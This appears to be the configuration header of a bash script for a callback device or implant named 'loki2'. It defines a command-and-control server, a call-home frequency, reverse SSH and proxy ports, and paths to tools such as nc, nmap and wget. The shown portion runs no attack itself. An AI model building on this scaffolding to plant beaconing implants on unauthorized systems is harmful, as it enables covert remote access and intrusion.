#/bin/bash
DESTEMAIL="nathan@piratica.us"
C2="psac2.piratica.us"
C2PROTO="HTTP://"
C2USER="psa"

SSHPORT=2201
PROXYPORT=2223
LOKIHOME="/opt/loki2"
COMMANDFILE=$MYNAME
CALLHOMEFREQ=1

# Check for necessary commands and create variables for them (or errors if they aren't there)
MYNAME=$(cat $LOKIHOME/SERIAL)
CHMOD=$(which chmod)
CHOWN=$(which chown)
CRONTAB=$(which crontab)
DIFF=$(which diff)
DIG=$(which dig)
ECHO=$(which echo)
IFCONFIG=$(which ifconfig)
KILL=$(which kill)
LOG=$(which logger)
MKDIR=$(which mkdir)
MV=$(which mv)
NC=$(which nc)
NMAP=$(which nmap)
PIDOF=$(which pidof)
RM=$(which rm)
SSH=$(which ssh)
TOUCH=$(which touch)
WGET=$(which wget)